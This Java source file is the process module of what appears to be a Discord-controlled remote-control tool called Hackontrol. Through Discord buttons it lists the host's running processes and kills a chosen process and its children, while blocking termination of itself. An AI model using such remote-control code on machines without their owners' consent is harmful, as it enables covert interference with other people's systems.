package com.khopan.hackontrol.module;

import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

import com.khopan.hackontrol.ProcessEntry;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.manager.interaction.StringSelectManager;
import com.khopan.hackontrol.nativelibrary.Kernel;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.context.ButtonContext;
import com.khopan.hackontrol.service.interaction.context.ModalContext;
import com.khopan.hackontrol.service.interaction.context.StringSelectContext;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.LargeMessage;
import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;

import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.selections.SelectOption;
import net.dv8tion.jda.api.interactions.components.selections.StringSelectMenu;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;
import net.dv8tion.jda.api.interactions.modals.ModalMapping;
import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;

public class ProcessModule extends Module {
	private static final String MODULE_NAME = "process";

	private static final Button BUTTON_SNAPSHOT  = ButtonManager.staticButton(ButtonType.SUCCESS, "Snapshot",  "processSnapshot");
	private static final Button BUTTON_REFRESH   = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",   "refreshSnapshot");
	private static final Button BUTTON_SORT      = ButtonManager.staticButton(ButtonType.SUCCESS, "Sort",      "sortSnapshot");
	private static final Button BUTTON_TERMINATE = ButtonManager.staticButton(ButtonType.DANGER,  "Terminate", "terminateProcess");

	private static final String MODAL_TERMINATE_PROCESS = "terminateProcessModal";

	private SortRule sortRule;

	public ProcessModule() {
		this.sortRule = SortRule.SORT_BY_NAME;
	}

	@Override
	public String getName() {
		return ProcessModule.MODULE_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_SNAPSHOT,         this :: send);
		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_REFRESH,          this :: buttonRefresh);
		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_SORT,             this :: buttonSort);
		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_TERMINATE,        this :: buttonTerminate);
		registry.register(InteractionManager.MODAL_REGISTRY,  ProcessModule.MODAL_TERMINATE_PROCESS, this :: modalTerminateProcess);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(ProcessModule.BUTTON_SNAPSHOT, ProcessModule.BUTTON_TERMINATE)).queue();
	}

	private void buttonRefresh(ButtonContext context) {
		HackontrolButton.deleteMessages(context);
		this.send(context);
	}

	private void buttonSort(ButtonContext context) {
		StringSelectMenu.Builder builder = StringSelectManager.dynamicMenu(this :: selectMenuSortType, context);
		builder.setMaxValues(1);
		SortRule[] rules = SortRule.values();

		for(int i = 0; i < rules.length; i++) {
			builder.addOption(rules[i].label, rules[i].name(), rules[i].description);
		}

		builder.setDefaultValues(this.sortRule.name());
		context.replyComponents(ActionRow.of(builder.build())).queue();
	}

	private void buttonTerminate(ButtonContext context) {
		ProcessEntry[] processList = Kernel.getProcessList();
		int minimumIdentifier = Integer.MAX_VALUE;
		int maximumIdentifier = Integer.MIN_VALUE;

		for(int i = 0; i < processList.length; i++) {
			minimumIdentifier = Math.min(minimumIdentifier, processList[i].processIdentifier);
			maximumIdentifier = Math.max(maximumIdentifier, processList[i].processIdentifier);
		}

		TextInput textInput = TextInput.create("processIdentifier", "Process Identifier", TextInputStyle.SHORT)
				.setRequired(true)
				.setMinLength(Integer.toString(minimumIdentifier).length())
				.setMaxLength(Integer.toString(maximumIdentifier).length())
				.setPlaceholder(minimumIdentifier + " - " + maximumIdentifier)
				.build();

		Modal modal = Modal.create(ProcessModule.MODAL_TERMINATE_PROCESS, "Terminate Process")
				.addActionRow(textInput)
				.build();

		context.replyModal(modal).queue();
	}

	private void modalTerminateProcess(ModalContext context) {
		ModalMapping mapping = context.getValue("processIdentifier");

		if(mapping == null) {
			HackontrolError.message(context.reply(), "Process identifier cannot be null");
			return;
		}

		String text = mapping.getAsString();
		int processIdentifier;

		try {
			processIdentifier = Integer.parseInt(text);
		} catch(Throwable Errors) {
			HackontrolError.message(context.reply(), "Invalid number format");
			return;
		}

		int currentProcessIdentifier = Kernel.getCurrentProcessIdentifier();

		if(processIdentifier == currentProcessIdentifier) {
			HackontrolMessage.boldDeletable(context.reply(), "Due to security reason, terminating the Hackontrol process is not allowed");
			return;
		}

		TimeSafeReplyHandler.start(context, consumer -> {
			ProcessEntry[] processList = Kernel.getProcessList();
			List<Integer> killList = new ArrayList<>();
			killList.add(processIdentifier);

			for(int i = 0; i < processList.length; i++) {
				ProcessEntry entry = processList[i];

				if(entry.parentProcessIdentifier == processIdentifier) {
					killList.add(entry.processIdentifier);
				}
			}

			int size = killList.size();

			for(int i = 0; i < size; i++) {
				Kernel.terminateProcess(killList.get(i));
			}

			HackontrolMessage.boldDeletable(ConsumerMessageCreateDataSendable.of(consumer), "Successfully terminate " + size + " process" + (size == 1 ? "" : "es"));
		});
	}

	private void selectMenuSortType(StringSelectContext context) {
		SelectOption option = context.getSelectedOptions().get(0);
		this.sortRule = Enum.valueOf(SortRule.class, option.getValue());
		context.getMessage().delete().queue();
		HackontrolButton.deleteMessages((ButtonContext) context.getParameters()[0]);
		this.send(context);
	}

	private void actionRow(MessageCreateRequest<?> request, long... identifiers) {
		request.addActionRow(ProcessModule.BUTTON_REFRESH, ProcessModule.BUTTON_SORT, ProcessModule.BUTTON_TERMINATE, HackontrolButton.delete(identifiers));
	}

	private void send(IReplyCallback callback) {
		List<ProcessEntry> processList = new ArrayList<>();
		processList.addAll(List.of(Kernel.getProcessList()));
		processList.sort(this.sortRule.comparator);
		int longestIdentifierLength = 0;

		for(int i = 0; i < processList.size(); i++) {
			longestIdentifierLength = Math.max(longestIdentifierLength, Integer.toString(processList.get(i).processIdentifier).length());
		}

		longestIdentifierLength += 3;
		int currentProcessIdentifier = Kernel.getCurrentProcessIdentifier();
		StringBuilder builder = new StringBuilder();

		for(int x = 0; x < processList.size(); x++) {
			ProcessEntry entry = processList.get(x);

			if(x > 0) {
				builder.append('\n');
			}

			builder.append('`');
			builder.append(entry.processIdentifier);
			int space = longestIdentifierLength - Integer.toString(entry.processIdentifier).length();

			for(int y = 0; y < space; y++) {
				builder.append(' ');
			}

			builder.append(entry.executableFile);

			if(entry.processIdentifier == currentProcessIdentifier) {
				builder.append(" (Current Process)");
			}

			builder.append('`');
		}

		LargeMessage.send(builder.toString(), callback, this :: actionRow);
	}

	private static enum SortRule {
		SORT_BY_NAME("Name", "Sort by process name", (x, y) -> x.executableFile.compareToIgnoreCase(y.executableFile)),
		SORT_BY_PID("Process Identifier", "Sort by process identifier", Comparator.comparingInt(x -> x.processIdentifier));

		private final String label;
		private final String description;
		private final Comparator<? super ProcessEntry> comparator;

		SortRule(String label, String description, Comparator<? super ProcessEntry> comparator) {
			this.label = label;
			this.description = description;
			this.comparator = comparator;
		}
	}
}
